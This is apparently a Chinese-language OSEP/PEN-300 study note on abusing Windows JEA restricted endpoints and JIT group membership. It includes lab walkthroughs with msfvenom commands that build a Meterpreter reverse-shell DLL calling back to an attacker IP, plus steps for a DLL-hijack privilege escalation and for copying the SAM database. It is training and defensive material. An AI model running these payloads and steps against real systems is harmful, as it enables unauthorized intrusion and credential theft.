---
title: OSEP-19-JEA-JIT利用
description: '19-JEA与JIT | 01-JEA-JIT利用'
pubDate: 2026-01-30T00:02:52+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
---

# JEA与JIT安全机制利用

## 1. Just Enough Administration (JEA) 概述

### 什么是JEA
```
JEA是微软在Windows Server 2016引入的安全功能:
├── 通过PowerShell实现委派管理
├── 给用户"刚好够用"的权限
├── 限制可执行的命令
├── 支持日志记录和审计
└── 减少高权限账户数量
```

### JEA核心组件
```
JEA配置文件:
├── Session Configuration File (.pssc)
│   ├── 定义会话类型
│   ├── 定义角色映射
│   └── 定义虚拟账户
└── Role Capabilities File (.psrc)
    ├── 定义可用命令
    ├── 定义可用Provider
    └── 定义参数验证
```

---

## 2. JEA配置文件分析

### Session Configuration File (.pssc)
```powershell
@{
    # 架构版本
    SchemaVersion = '2.0.0.0'

    # 唯一标识符
    GUID = 'e4f7e55c-57dc-41b2-bab0-ae4bb209fbe9'

    # 会话类型 (Default/RestrictedRemoteServer/Empty)
    # RestrictedRemoteServer = NoLanguageMode (推荐)
    # Default = FullLanguageMode (危险!)
    SessionType = 'RestrictedRemoteServer'

    # 日志目录
    TranscriptDirectory = 'C:\Transcripts\'

    # 使用虚拟账户 (推荐)
    RunAsVirtualAccount = $true

    # 角色定义
    RoleDefinitions = @{
        'CORP\JEA_Users' = @{ RoleCapabilities = 'FileManagement' }
    }
}
```

### Role Capabilities File (.psrc)
```powershell
@{
    # 可见的Cmdlet
    VisibleCmdlets = 'Copy-Item', 'Get-ChildItem'

    # 可见的Provider
    VisibleProviders = 'FileSystem'

    # 可见的函数
    VisibleFunctions = 'Get-Date'

    # 可见的外部命令
    VisibleExternalCommands = 'C:\Windows\System32\whoami.exe'
}
```

---

## 3. JEA枚举

### 发现JEA端点
```powershell
# 检查PowerShell历史
(Get-PSReadlineOption).HistorySavePath
type C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# 查找JEA连接命令
# Enter-PSSession -ComputerName server -ConfigurationName j_config
```

### 连接JEA端点
```powershell
# 使用ConfigurationName连接
Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02

# 检查可用命令
Get-Command

# 检查语言模式
$ExecutionContext.SessionState.LanguageMode
```

### 检查可用命令
```powershell
[files02]: PS> Get-Command

CommandType     Name                    Version    Source
-----------     ----                    -------    ------
Function        Clear-Host
Function        Exit-PSSession
Function        Get-Command
Function        Get-FormatData
Function        Get-Help
Function        Measure-Object
Function        Out-Default
Function        Select-Object
Cmdlet          Copy-Item               3.0.0.0    Microsoft.PowerShell.Management
```

---

## 4. JEA突破技术

### 利用无验证的Copy-Item
```powershell
# 如果Copy-Item没有路径限制
# 可以复制任意文件

# 复制敏感文件
[files02]: PS> Copy-Item -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\shares\home\user'

# 复制SAM数据库 (需要管理员权限)
[files02]: PS> Copy-Item -Path 'C:\Windows\System32\config\SAM' -Destination 'C:\shares\home\user'
```

### DLL劫持攻击
```powershell
# 1. 识别目标服务加载的DLL
# 使用Process Monitor监控

# 2. 生成恶意DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -a x64 --platform windows -f dll > msasn1.dll

# 3. 通过JEA复制DLL到目标目录
[files02]: PS> Copy-Item C:\shares\home\user\msasn1.dll -Destination "C:\Program Files\FileZilla Server\msasn1.dll"

# 4. 等待服务重启
# 获取SYSTEM权限shell
```

### 危险的JEA命令
```
应避免在JEA中使用的命令:
├── Invoke-Expression - 执行任意代码
├── Start-Process - 启动任意进程
├── Invoke-Command - 远程执行命令
├── New-Object - 创建任意对象
├── Add-Type - 添加.NET类型
└── 无限制的Copy-Item - 复制任意文件
```

---

## 5. Just-In-Time (JIT) 概述

### 什么是JIT
```
JIT是一种安全机制:
├── 提供临时的管理员权限
├── 权限在指定时间后自动撤销
├── 减少永久高权限账户
├── 需要审批流程
└── 与AD PAM功能配合使用
```

### JIT工作流程
```
1. 用户请求访问特定组
2. 审批者批准请求
3. 用户被临时添加到组
4. 时间到期后自动移除
```

---

## 6. JIT枚举

### 检查PAM功能是否启用
```powershell
# 导入AD模块
Import-Module Microsoft.ActiveDirectory.Management.dll

# 检查可选功能
Get-ADOptionalFeature -Filter *

# 输出示例:
# Name: Privileged Access Management Feature
# IsDisableable: False
```

### 枚举JIT相关组
```powershell
# 查找请求组
Get-NetGroup j_request | select member

# 查找审批组
Get-NetGroup j_approve | select member

# 枚举GPO
Get-NetGPO | select displayname
```

### 分析GPO配置
```powershell
# 获取GPO详情
Get-NetGPO l_web01

# 读取Groups.xml
type \\corp.com\SysVol\corp.com\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
```

### Groups.xml示例
```xml
<Groups>
<Group name="Administrators (built-in)">
<Properties action="U">
<Members>
<Member name="CORP\la_web" action="ADD"/>
</Members>
</Properties>
<Filters>
<FilterComputer name="WEB01"/>
</Filters>
</Group>
</Groups>
```

---

## 7. JIT利用

### 请求组成员身份
```powershell
# 通过JIT Web应用请求访问
# 访问 http://mgmt01
# 选择目标组并提交请求
```

### 刷新Kerberos票据
```powershell
# 清除现有票据
klist purge

# 连接到目标服务器 (获取新票据)
Enter-PSSession -ComputerName WEB01

# 验证组成员身份
whoami /groups
# 应显示新的组成员身份
```

### 利用临时权限
```powershell
# 获得la_web组成员身份后
# 成为WEB01的本地管理员

[WEB01]: PS> whoami /groups
# BUILTIN\Administrators
# CORP\la_web

# 执行管理操作
[WEB01]: PS> Get-Process
[WEB01]: PS> Get-Service
```

---

## 8. 实战示例

### JEA突破完整流程
```powershell
# 1. 发现JEA端点
type C:\Users\mary\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02

# 2. 连接JEA
Enter-PSSession -ComputerName files02 -ConfigurationName j_fs02

# 3. 枚举可用命令
Get-Command

# 4. 测试Copy-Item限制
Copy-Item -Path 'C:\Windows\System32\drivers\etc\hosts' -Destination 'C:\shares\home\mary'

# 5. 准备恶意DLL
# 在Kali上生成
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.48.4 LPORT=443 -f dll > msasn1.dll

# 6. 上传并复制DLL
Copy-Item C:\shares\home\mary\msasn1.dll -Destination "C:\Program Files\FileZilla Server\msasn1.dll"

# 7. 等待服务重启获取shell
```

### JIT利用完整流程
```powershell
# 1. 枚举PAM功能
Get-ADOptionalFeature -Filter *

# 2. 发现JIT应用
# 检查浏览器历史或网络枚举

# 3. 枚举GPO了解组权限
Get-NetGPO | select displayname
type \\corp.com\SysVol\corp.com\Policies\{GUID}\...\Groups.xml

# 4. 请求组成员身份
# 通过Web应用提交请求

# 5. 等待审批

# 6. 刷新票据
klist purge

# 7. 使用新权限
Enter-PSSession -ComputerName WEB01
whoami /groups
```

---

## 9. 防御建议

### JEA安全配置
```
1. 使用RestrictedRemoteServer会话类型
2. 启用虚拟账户
3. 限制可用命令和参数
4. 启用日志记录
5. 定期审计配置
6. 避免危险命令
```

### JIT安全配置
```
1. 实施多人审批
2. 限制请求时间窗口
3. 监控组成员变更
4. 审计所有请求和审批
5. 使用最小权限原则
6. 定期审查权限配置
```

---

## 常用命令速查

| 命令 | 说明 |
|------|------|
| `Enter-PSSession -ConfigurationName X` | 连接JEA端点 |
| `Get-Command` | 列出可用命令 |
| `Get-ADOptionalFeature -Filter *` | 检查PAM功能 |
| `klist purge` | 清除Kerberos票据 |
| `whoami /groups` | 查看组成员身份 |
| `Get-NetGPO` | 枚举GPO |
